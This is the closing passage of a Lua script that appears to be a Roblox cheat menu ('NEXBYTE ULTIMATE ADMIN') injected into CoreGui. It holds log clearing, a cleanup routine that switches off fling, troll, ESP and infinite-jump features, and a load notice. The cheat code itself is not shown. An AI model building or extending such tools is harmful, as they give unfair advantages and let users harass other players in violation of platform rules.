    NEXBYTE._LOGS = {}
    NXNotify("LOGS", "Cleared")
end})

NXLogs:CreateText({name="LogCount", text="Log entries: " .. tostring(#NEXBYTE._LOGS)})

-- =====================================================
-- CLEANUP
-- =====================================================
ScreenGui = game:GetService("CoreGui"):FindFirstChild("NEXBYTE_ULTIMATE_ADMIN")
if ScreenGui then
    ScreenGui.Destroying:Connect(function()
        NEXBYTE._FlingActive = false
        NEXBYTE._TouchFlingActive = false
        NEXBYTE._TrollActive = false
        NEXBYTE._ESPActive = false
        NEXBYTE._NightVision = false
        if NEXBYTE._InfJumpConn then NEXBYTE._InfJumpConn:Disconnect() end
        if NEXBYTE._ShakeConn then NEXBYTE._ShakeConn:Disconnect() end
        pcall(function() GuiService:SetGameplayPausedNotificationEnabled(true) end)
    end)
end

NXNotify("NEXBYTE ULTIMATE ADMIN", "Loaded successfully - 15+ modules active")


return NEXBYTE